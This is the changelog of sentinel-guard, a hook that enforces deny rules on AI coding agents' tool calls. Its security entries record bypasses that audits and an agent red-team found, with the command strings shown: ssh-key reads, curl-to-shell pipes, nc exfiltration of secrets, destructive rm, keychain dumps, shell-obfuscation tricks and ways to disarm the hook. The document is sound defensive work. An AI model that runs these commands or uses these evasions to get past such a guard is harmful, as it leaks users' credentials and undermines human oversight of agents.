# Changelog

All notable changes to sentinel-guard are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/), and this project uses semantic
versioning.

## [Unreleased]

### Security
- **Close the cd-relative path bypass (audit F-1).** A relative operand after a
  literal `cd` (`cd ~ && cat .ssh/id_rsa`) never reached a `~/.ssh/*` rule
  because candidates were only mined, never resolved against the directory the
  shell had moved to. Relative candidates are now joined onto the tracked `cd`
  target (literal, `$HOME`, or `~`; ambiguous targets stop tracking), including
  successive relative directory changes and `sh -c` payloads. Quoted newlines
  remain part of their argument. A command-position-aware walk keeps arguments
  from being mistaken for a directory change.
- **Close the recursive-traversal bypass (audit F-2).** `cp -r ~ /tmp`,
  `tar czf x.tgz ~`, `rsync -a ~/ /dst`, `grep -r AKIA ~`, `ditto`, and `find`
  read every protected subtree under the operand while mining only the bare
  home dir as a candidate. A subtree rule now fires when a recursive tool's
  source operand covers the rule's protected directory. Destinations, option
  values, and paths in unrelated command segments do not inherit that status.
  tar counts only in create mode; archive filenames are not mode flags.
  cp/rsync/grep require an explicit recursive flag.
- **Exclusive temporary-file creation for install writes (audit F-3).** `atomic_write` used a
  predictable `<target>.tmp` opened without `O_EXCL`, so a planted symlink
  could redirect an install/uninstall write into any file. Temp files are now
  uniquely named and `create_new`-opened with retry, file fsync and best-effort
  parent-directory sync, mirroring the policy-migrate pattern.
- **Audit-trail tamper discipline (audit F-4).** `audit.jsonl` and its
  directory are created 0600/0700 on Unix. Existing paths are checked through opened
  handles before permissions are tightened; symlinks and unsupported file
  types are refused. Advisory locking keeps complete records together across
  cooperating Sentinel writers. Logging failures produce stderr diagnostics
  without changing the hook decision. Write/Edit/MultiEdit on the trail is
  blocked by self-protect.
- **Honor `CLAUDE_CONFIG_DIR` (audit F-5).** With the variable set, Claude
  Code ignores `~/.claude/settings.json`; install/status/doctor and
  self-protection now share the configured settings paths.
- **PATH hardening (audit F-6).** The dead `which` fallback in install is
  removed (a hijacked `which` stdout would have been baked into the hook
  command), and the Codex activation probe selects a usable `codex`
  executable in common absolute install locations before falling
  back to PATH. The fallback still trusts the caller's executable environment.
- **Reject flag-shaped Codex thread ids (audit F-7).** An agent-reported
  thread id that starts with `-` or contains whitespace is argv injection
  into the next `codex exec resume` and now fails the schema instead of being
  reused.
- **Reject invalid HOME.** Missing, empty, and relative values produce an
  explicit error instead of resolving Sentinel state against the working
  directory. Installation checks this before changing files; evaluation uses
  its closed-failure response and logging refuses the invalid location.
- Audit workspaces are created 0700; the MCP baseline temp name is
  attempt-suffixed with `AlreadyExists` retry so a pre-created file cannot
  wedge `audit-mcp --update`; `.gitignore` now covers `.env*`.
- `sentinel verify` grows from 45 to 64 pinned cases: ten regression cases
  (cd-relative, recursive traversal) plus nine benign guards
  (`tar xzf -C ~`, project-scoped recursion, cd-decoys) so these classes stay
  closed.

- Harden deny-path brace analysis, install preflight parsing, hook-event
  preservation, quoted fetch-to-shell detection, and autorun checks across
  symlink aliases. Uncheckable path syntax now follows the configured failure
  posture without suppressing independently proven blocks, while direct and
  quoted literal paths retain their shell semantics.

## [0.5.0] - 2026-07-28

### Added
- Supply-chain security CI: CodeQL (rust + actions), OpenSSF Scorecard with
  published results, cargo-deny (advisories/bans/licenses/sources) on a daily
  cron, dependency review on PRs, and Dependabot for cargo + actions updates.
- `SECURITY.md` (private vulnerability reporting), `CONTRIBUTING.md`, and the
  `LICENSE-MIT` / `LICENSE-APACHE` files the README badge always pointed at.
- **Stateful real-agent audit.** Claude Code and Codex adapters resume one
  structured session across the turns of each sequence, isolate separate
  sequences, correlate action evidence, bound runtime and output, and require
  `--unsafe-host` because no containment layer ships.
- **Versioned audit corpus.** `corpus/v1` bundles three project-authored safe
  canaries with provenance and license notes; explicit filesystem overrides are
  deterministic and schema-validated.
- **Native lifecycle health.** Claude Code and Codex install/uninstall now
  reconcile direct and Ghost-mediated ownership. Status and doctor inspect
  activation, Codex trust, conflicts, policy health, and a real deny canary.
- **Explicit MCP baselines.** Discovery is read-only until `audit-mcp --update`;
  versioned baselines store salted canonical digests and strict mode reports
  added, changed, missing, or removed servers.
- **Validated policy migration.** `policy-migrate --check` reports drift;
  `--apply` uses a comment-preserving three-way merge, backup, atomic write, and
  lint/verifier/self-protect/canary validation with rollback on failure.
- **Release evidence.** CI now includes Rust 1.85 MSRV, docs-claims, and
  extracted-package gates. Tag releases enforce source identity, build four
  targets, generate SBOMs and checksums, attest artifacts, and publish the crate
  before making the GitHub release public.

### Changed
- All workflow actions are now pinned to full commit SHAs with least-privilege
  `permissions` blocks and `persist-credentials: false` on checkouts.
- Host payloads now pass through one typed normalization and policy pipeline.
  Codex `apply_patch` is treated as a file mutation, not executable shell text.
- The crate package explicitly includes source, tests, assets, the versioned
  corpus, Cargo manifests, security docs, and both licenses.
- Native lifecycle support is stated narrowly: Sentinel manages Claude Code and
  Codex; other hook-capable agents may use the lower-level evaluate contract.

### Security
A batch of policy-bypass fixes from an adversarial review pass over the default
ruleset and matchers. Each lands with regression tests; `verify` stays 45/45 and
the zero-false-positive-block ethos is preserved.

- **Pipe-to-shell wrappers** (#33). `curl … | env sh`, `| /usr/bin/env bash`,
  `| nice sh`, `| tee f | sh` now block. The shell is matched only at a command
  position (right after a pipe, or after a known exec-wrapper), so a fetch piped
  into a filter whose argument merely names a shell (`… | grep ssh`) does NOT
  false-block, and every `*sh` shell name keeps coverage.
- **`rm -rf` with a later absolute operand** (#34). `rm -rf ./build /etc` and
  `rm -rf /~ /` block; `rm -rf ~/scratch` stays allowed.
- **`nc`/`ncat` stdin exfil behind quoted/escaped separators** (#44). A quoted
  separator (`nc h 443 "x;y" < secret`) no longer hides the redirect, and an
  escaped quote inside a double-quoted arg no longer aborts matching early.
- **settings.json rewrite via redirect** (#31). `<`/`>` immediately after the
  path (`sed -i … settings.json</dev/null`) are treated as token terminators.
- **`~/.claude` deletion with a trailing slash** (#32). `rm -rf ~/.claude/`
  blocks; a subdir cleanup (`rm -rf ~/.claude/projects/old`) still doesn't.
- **case-varied HTTP clients in the secret-env exfil rule** (#45). `CURL` /
  `Wget` data uploads referencing a secret-looking env var now block.
- **allow-list brace-expansion fail-open** (#39). Every shell brace-expansion of
  a path must be covered by an allow rule (`cat {ok,/tmp/secret}` blocks); an
  expansion past the 64-way cap fails closed rather than allowing on a partial
  check.
- **glob witnesses leaking into allow matching** (#47). The deny-only deglob
  fail-safe no longer fail-opens allow rules.
- **credential paths with spaces** (#42). A quote/escape-aware lexer keeps
  `"~/Library/Application Support/…/Cookies"` a single token so spaced deny.path
  rules can't be split apart.
- **npm preflight install-dir redirection** (#35). A trailing `&& cd /tmp` (or a
  later `--prefix`) no longer points manifest inspection away from the install.
- **self-protect for non-Claude agents** (#30). Hook-removal escalation now
  covers Gemini / Crush / Codex configs and resolves the target across all path
  aliases (a benign first alias can't shadow a real config path behind it).
- **autorun detection across path aliases** (#36). A malicious config in a later
  alias (`file_path` benign, `path` = `.mcp.json`) is no longer shadowed.

### Fixed
- **Build break on `main`** (#49). #41 had been merged on top of #48 against a
  stale base, leaving `evaluate()` referencing undeclared
  `post_secret_held` / `path_held`. Reverted — #48 already delivers the same
  intent (a block-tier secret overrides every held warn: tool, path, command).

### Removed
- **Unshipped public surfaces.** Removed the PTY proxy and mutable corpus-update
  stubs. Real-agent audit has no sandbox fallback or hidden download path.
- **Dead tier scaffolding.** Deleted the unwired Tier-2 heuristic analyzer
  (`src/heuristic/`) and Tier-3 LLM classifier stub (`src/classifier/`), neither
  of which was ever on the `evaluate` hot path. The heuristic tier's drift signal
  only fired on calls Tier 1 already blocked, and a model in the decision path
  conflicts with the zero-false-positive and local/offline guarantees. Sentinel
  is now one deterministic tier by design. Dropped the heuristic-only
  `aho-corasick` and `bincode` dependencies. No behavior change: enforcement was
  already Tier-1-only.

## [0.4.0] - 2026-06-15

Hardening + reach: a second enforcement channel, the injection guard generalized
across every agent it now adapts to, result-secret detection, MCP policing, and
multi-agent support. Two octo-debate passes (codex + opencode, CLI-only) drove
the last two items. 260 tests; clippy clean; zero-FP-block ethos preserved.

### Added
- **Multi-agent adapters.** The engine is agent-agnostic; `evaluate --agent <name>`
  emits the right decision shape per host: `claude-code`/`codex` (nested
  `hookSpecificOutput`, identical contracts), `gemini`/`crush`
  (`{"decision":"deny"}`), and `generic` (`{"decision":"block"}` + exit 2 for any
  command-hook agent). A block always also exits 2, the universal hard-block
  signal. `install --agent <name>` prints the host-specific hook config (Codex
  `config.toml`, Gemini `BeforeTool`, Crush `crush.json`, opencode JS shim); Aider
  is documented as unsupported (no scriptable pre-tool hook).
- **`sentinel post-evaluate`** (opt-in via `install --result-scan`): a PostToolUse
  hook that scans a tool RESULT for block-tier secret shapes and emits an
  `additionalContext` nudge. Detection + alert only — PostToolUse fires after the
  tool ran, so it cannot prevent the leak and never echoes the matched value.
- **MCP policing.** `deny.tools` — a deny rule matched against the tool NAME via
  glob, so an MCP server/tool can be blocked or warned by name (no default rule;
  opt-in lockdown). `sentinel audit-mcp` — a read-only trust-on-first-use
  enumerator of configured MCP servers that flags a new or changed launch command.
- **Autorun-injection guard across every agent + MCP config** (debate pass #1):
  a config write that ADDS a malicious hook command or MCP server launch line —
  in Claude/Gemini/Crush settings JSON, Codex `config.toml`, or
  `.mcp.json`/`~/.claude.json` — is re-evaluated through the zero-FP deny.commands
  rules and blocked on a block-tier match, closing the plant-an-autorun gap the
  adapters opened. Benign hooks/servers pass.

### Changed
- **A block now also exits 2.** Enforcement no longer rides the stdout JSON alone
  (the 0.2.0 silent-death failure mode): every deny path also exits 2, which
  Claude Code honors as a hard block regardless of how it parses stdout.
- **install-preflight follows the effective install directory** (debate pass #2):
  it resolves a literal `cd <dir>` / `--prefix`/`-C`/`--cwd`/`--dir` before reading
  the manifest, closing the monorepo/subdir evasion (`cd packages/foo &&
  npm install`). A dynamically-built or ambiguous install dir is skipped rather
  than guessed, so it never inspects the wrong manifest.

## [0.3.0] - 2026-06-14

Round-two attacker-audit hardening: an external agent red-teamed the enforce-mode
policy from an attacker's perspective (go around the hook, not through it), and a
six-lens adversarial pass over the real code surfaced more. Every verified hole is
closed; the verify CI gate grew from 20 to 41 pinned cases; honest about the
residual structural ceiling.

### Changed
- **`sentinel install` now enforces by default.** A security tool that ships in
  log-only mode protects nobody, and the cheapest attack on a disable-able guard
  is to leave it disabled. `--audit` opts back into log-only; `--enforce` is kept
  as an accepted no-op. Install still never overwrites an existing policy, so an
  audit-mode user upgrading is not silently flipped. `status` warns when off.
- **Engine ordering:** a `deny.paths` WARN no longer short-circuits. It is held
  and a `deny.commands` BLOCK can override it (so `rm ~/.claude/settings.json` and
  `curl -d @.env` block instead of being shadowed by the warn-tier path). A secret
  written into a warn-tier path still stays warn (the intended `.env` behavior).
- **`sentinel check`** now applies the same `selfprotect` + `preflight`
  escalations the live hook does, so it no longer under-reports coverage.

### Added
- **Broadened credential stores** (block): docker/podman registry auth,
  `~/.git-credentials`, HuggingFace/crates tokens, `~/.pgpass` / `~/.my.cnf`,
  rclone/oci/doctl/fly/databricks/terraform, macOS user + system Keychains, every
  major browser's cookie/login store, 1Password/Bitwarden/pass/KeePass vaults,
  crypto wallets, and editor SecretStorage (`state.vscdb`).
- **Exfil without a network pipe:** `gpg --export-secret-keys`, `security
  dump-keychain` / `find-*-password -w`, `dscl -read … Password` (block);
  `env`/`printenv` dumped to a file, secret-named `printenv`, `git credential
  fill`, `defaults read` of a secret-named key (warn).
- **Guard-disarm coverage:** binary tamper via `chmod`/`chflags`/`strip`/
  `truncate`/`install`/redirect against the literal or `$(command -v sentinel)`
  path; `sentinel uninstall`; deleting `~/.claude` or `~/.sentinel`; and rewriting
  `.claude/settings.json` from a shell child (`sed -i`/redirect/`tee`).
- **Egress channels:** DNS tunnelling (command-sub query name blocks; TXT/ANY
  warns), git transport (credential-in-URL blocks; literal-URL push/remote-add
  warns), scp/rsync/rclone/cloud-upload (warn). Curl glued short-flag exfil
  (`-d@FILE`, `-T/path`, `-d$(cmd)`) and secret-in-URL/-header (warn).
- **Interpreter credential reads** via a runtime-assembled path
  (`readFileSync(process.env.HOME+'/.ssh/id_rsa')`, `expanduser`, `Dir.home`).
- **Shell-resolution de-obfuscation** wired into extraction and command matching:
  ANSI-C `$'\xHH'`/`\uHHHH`/octal escapes, `${IFS}` word-splitting, and brace
  expansion - each a transform the shell actually performs. Homoglyph/fullwidth
  folding deliberately omitted (cosmetic, FP-prone: the shell never resolves it).
- Earlier warn coverage for the remaining Claude Code agent-config surfaces
  (`**/.claude/skills/**`, `**/.claude/agents/**`, `**/.claude/hooks/**`,
  `**/.mcp.json`).

## [0.2.1] - 2026-06-09

Critical enforcement fix: blocks were silently ignored by Claude Code.

### Fixed
- **PreToolUse blocks are now actually enforced.** The hook emitted a flat
  top-level `{"permissionDecision":"deny"}` and exited 0. Current Claude Code only
  honors a block when `permissionDecision` is nested under `hookSpecificOutput`
  (with `hookEventName` and `permissionDecisionReason`), so every block was a
  no-op — the policy decided correctly, the audit log recorded `block`, and the
  tool call ran anyway. Output now uses the nested contract. Allow/warn still emit
  an empty object to defer to Claude Code's normal permission flow (never
  `permissionDecision:"allow"`, which would auto-approve every un-blocked call).

### Added
- `tests/hook_contract.rs` — end-to-end test that drives the real `sentinel
  evaluate` binary and asserts the on-the-wire deny shape Claude Code enforces.
  The regression gate that was missing: `verify` and the audit log both test the
  decision, never the wire format, which is how the no-op block shipped unnoticed.

## [0.2.0] - 2026-06-01

Five new subcommands and a supply-chain hardening pass for the default policy.

### Added
- `sentinel check '<hook-json>'` - dry-run a tool call against the installed policy and explain the decision. Prints the matched rule plus the effective outcome in the current mode, so a fresh audit-mode install shows "would be blocked in enforce mode" rather than a bare "Block". Read-only: no execution, no audit logging.
- `sentinel verify` - replay a pinned set of attacks (and benign baselines) through the real evaluate path and assert each behaves as expected. Exits non-zero on any miss, and is wired into CI as a regression gate. Checks the installed policy if present, else the bundled default.
- `sentinel doctor [--strict]` - validate the full install chain (hook entry present, the hooked binary runs and identifies as sentinel, the policy loads, the self-protect rule is present) and probe liveness. Detects a disarmed guard (deleted or repointed hook). Surfaces an audit-to-enforce trust ramp from the audit trail. `--strict` exits non-zero on real failures, never on a healthy idle install.
- `sentinel policy-diff` - print the bundled-default rules missing from an installed policy, as pasteable TOML. Read-only; reaches installs that predate a hardening update (install never overwrites an existing policy).
- `sentinel policy-lint` - static-check a policy for invalid regexes (dead rules), exact-duplicate unreachable patterns, and over-broad allow-list entries.
- shai-hulud / Miasma agent-side hardening rules in the default policy: self-protect of `~/.sentinel/policy.toml`, expanded credential coverage (`~/.npmrc`, `~/.kube/config`, `~/.config/gcloud`, `~/.azure`, plus GCP / Azure / Vault / kubeconfig secret content), and warn-tier tripwires for agent-driven persistence and package-publish TTPs.

### Changed
- Install writes (`~/.claude/settings.json`, `~/.sentinel/policy.toml`) are now atomic: serialize, write a temp file, then rename. A failed write can no longer truncate the real file.

### Fixed
- The `.env` deny rule now uses `**/.env` (and `**/.env.*`) so absolute, deep paths like `/Users/me/app/config/.env` match. The previous `*/.env` only matched a single-segment prefix.

### Notes on scope (honest limits)
- Sentinel intercepts the agent's own tool calls. It does not, and cannot, inspect npm/pip lifecycle-script child processes, so it covers the prompt-injection-drives-the-agent variant of these supply-chain TTPs, not a worm self-propagating.
- Binary-tamper protection is detection (via `doctor` at check time), not prevention: a binary deleted mid-session fails open silently.

## [0.1.0]

- Initial release: PreToolUse policy engine with deny rules for paths (glob), commands (regex), and secrets; audit and enforce modes; fail-closed posture on un-inspectable input; path canonicalization (`~`/`$HOME`/symlink/case); and a prompt-injection attack-corpus audit harness.
